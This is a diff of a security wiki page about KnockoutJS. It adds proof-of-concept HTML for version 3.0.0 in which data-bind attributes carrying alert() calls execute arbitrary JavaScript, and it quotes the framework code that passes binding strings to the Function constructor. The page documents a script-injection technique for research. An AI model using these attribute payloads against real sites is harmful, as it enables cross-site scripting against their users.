@@ -19,7 +19,7 @@ From http://en.wikipedia.org/wiki/KnockoutJS
 
 = Quick Facts =
 
- * [http://knockoutjs.com/downloads/knockout-2.3.0.debug.js KnockoutJS 2.3.0 (Uncompressed)]
+ * [http://knockoutjs.com/downloads/knockout-3.0.0.debug.js KnockoutJS 3.0.0 (Uncompressed)]
  * Usage Stats http://trends.builtwith.com/javascript/KnockoutJS
 
 
@@ -31,6 +31,8 @@ From http://en.wikipedia.org/wiki/KnockoutJS
 
 = Injection Attacks =
 
+== KnockoutJS 2.3.0 ==
+
 KnockoutJS is attackers best friend since it allows to execute arbitrary !JavaScript by injecting into HTML5 data attributes. Any labelled !JavaScript code that is being found inside a `data-bind` attribute will be evaluated once the bindings are being applied by KnockoutJS.
 
 The following "paste-and-go"-ready code example demonstrates that. 
@@ -40,6 +42,20 @@ The following "paste-and-go"-ready code example demonstrates that.
 <div data-bind="x:alert(1)" />
 <script> 
 	ko.applyBindings();
+</script>
+}}}
+
+== KnockoutJS 3.0.0 ==
+
+Not much has changed - only the example above doesn't work any more. Well, with some quick changes applied we can get our `alert` back and do the same as we did before:
+
+{{{
+<script src="http://knockoutjs.com/downloads/knockout-3.0.0.js"></script>
+<div data-bind="click: alert(1)"></div>
+<div data-bind="value: alert(2)"></div>
+<select data-bind="options: alert(3)"></select>
+<script> 
+ko.applyBindings();
 </script>
 }}}
 
@@ -61,4 +77,17 @@ parseBindingsString: function(b, c, d) {
         throw h.message = "Unable to parse bindings.\nBindings value: " + b + "\nMessage: " + h.message, h;
     }
 }
+}}}
+
+In KnockoutJS 3.0.0 - the example above shows code from 2.3.0 - things have changed a little bit. The way our code is being executed is still the same though: the value of `data-bind` is being parsed and parts of it are passed to the function constructor. 
+
+{{{
+    function createBindingsStringEvaluator(bindingsString, options) {
+        // Build the source for a function that evaluates "expression"
+        // For each scope variable, add an extra level of "with" nesting
+        // Example result: with(sc1) { with(sc0) { return (expression) } }
+        var rewrittenBindings = ko.expressionRewriting.preProcessBindings(bindingsString, options),
+            functionBody = "with($context){with($data||{}){return{" + rewrittenBindings + "}}}";
+        return new Function("$context", "$element", functionBody);
+    }
 }}}
